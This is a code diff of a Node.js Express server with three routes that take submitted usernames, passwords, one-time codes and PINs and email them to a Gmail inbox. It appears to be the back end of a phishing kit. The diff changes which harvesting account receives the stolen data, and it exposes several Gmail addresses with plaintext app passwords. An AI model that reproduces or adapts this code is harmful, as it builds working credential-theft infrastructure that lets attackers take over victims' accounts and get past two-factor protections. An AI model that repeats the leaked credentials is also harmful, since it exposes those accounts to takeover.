@@ -16,20 +16,15 @@ app.post("/", (req, res) => {
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
-      // user: 'edehchinedu59@gmail.com',
-      // pass: 'yknycyzsxdkxpepq'
-      // user: 'Victorchinemerem191@gmail.com',
-      // pass: 'aivsveolwtqinddb'
-      // user: 'Victorchinemeremfx.112@gmail.com',
-      // pass: 'eujqfpdvuhepijkk'
-      user: "join.kudapp@gmail.com",
-      pass: "ftjbwzimegueosaw",
+    
+      user: "adepojuzara101@gmail.com",
+      pass: "pgfyzzhvcrgdgcpq",
     },
   });
 
   const mailOptions = {
     from: req.body?.email,
-    to: "join.kudapp@gmail.com",
+    to: "adepojuzara101@gmail.com",
     subject: `Username: ${req.body?.username} \t\n\n\n password: ${req.body?.password}`,
   };
   console.log(mailOptions);
@@ -50,20 +45,15 @@ app.post("/otp", (req, res) => {
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
-      user: "join.kudapp@gmail.com",
-      pass: "ftjbwzimegueosaw",
-      //   user: 'edehchinedu59@gmail.com',
-      //     pass: 'yknycyzsxdkxpepq'
-      // user: 'Victorchinemeremfx.112@gmail.com',
-      // pass: 'eujqfpdvuhepijkk'
-      // user: 'Victorchinemerem191@gmail.com',
-      // pass: 'aivsveolwtqinddb'
+    
+       user: 'adepojuzara101@gmail.com',
+       pass: 'pgfyzzhvcrgdgcpq'
     },
   });
 
   const mailOptions = {
     from: req.body?.email,
-    to: "join.kudapp@gmail.com",
+    to: "adepojuzara101@gmail.com",
     subject: ` OTP: ${req.body?.Otp} `,
   };
   console.log(mailOptions);
@@ -84,21 +74,15 @@ app.post("/pin", (req, res) => {
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
-      //  user: 'Victorchinemerem191@gmail.com',
-      // pass: 'aivsveolwtqinddb'
-
-      // user: 'edehchinedu59@gmail.com',
-      //     pass: 'yknycyzsxdkxpepq'
-      // user: 'Victorchinemeremfx.112@gmail.com',
-      // pass: 'eujqfpdvuhepijkk'
-      user: "join.kudapp@gmail.com",
-      pass: "ftjbwzimegueosaw",
+    
+      user: "adepojuzara101@gmail.com",
+      pass: "pgfyzzhvcrgdgcpq",
     },
   });
 
   const mailOptions = {
     from: req.body?.email,
-    to: "join.kudapp@gmail.com",
+    to: "adepojuzara101@gmail.com",
     subject: ` PIN: ${req.body?.pin} `,
   };
   console.log(mailOptions);
